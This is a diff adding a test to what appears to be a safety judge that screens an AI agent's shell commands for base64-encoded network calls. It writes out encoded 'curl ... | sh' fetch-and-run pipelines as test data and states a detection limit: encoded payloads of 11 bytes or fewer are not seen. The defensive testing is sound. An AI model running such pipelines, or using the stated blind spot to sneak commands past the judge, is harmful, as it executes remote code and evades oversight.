@@ -49,3 +49,14 @@ test("the judge refuses an encoded network command under a Mandate without the n
   assert.equal(judge({ name: "bash", args: { command: "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q= | base64 -d" } }, scopes, []).allow, true);
   assert.equal(judge({ name: "bash", args: { command: "npm test" } }, scopes, []).allow, true);
 });
+
+test("boundary: a base64 run of 16 characters is decoded and its network command read; a run of 15 is not decoded (a stated limit: a payload of 11 bytes or fewer is not seen)", () => {
+  const b16 = Buffer.from("curl x.co/abc").toString("base64");   // 13 bytes: 20 characters, padded
+  assert.ok(decodedViews(`echo ${b16} | base64 -d | sh`).some((v) => /curl x\.co\/abc/.test(v)));
+  const sixteen = Buffer.from("curl x.co/ab").toString("base64"); // 12 bytes: exactly 16 characters, no padding
+  assert.equal(sixteen.length, 16);
+  assert.ok(decodedViews(`echo ${sixteen} | base64 -d | sh`).some((v) => /curl x\.co\/ab/.test(v)), "16 characters");
+  const fifteen = Buffer.from("curl x.co/a").toString("base64").replace(/=+$/, ""); // 15 characters once the padding is dropped
+  assert.equal(fifteen.length, 15);
+  assert.ok(!decodedViews(`echo ${fifteen} | base64 -d | sh`).some((v) => /curl x\.co\/a/.test(v)), "15 characters: not decoded");
+});
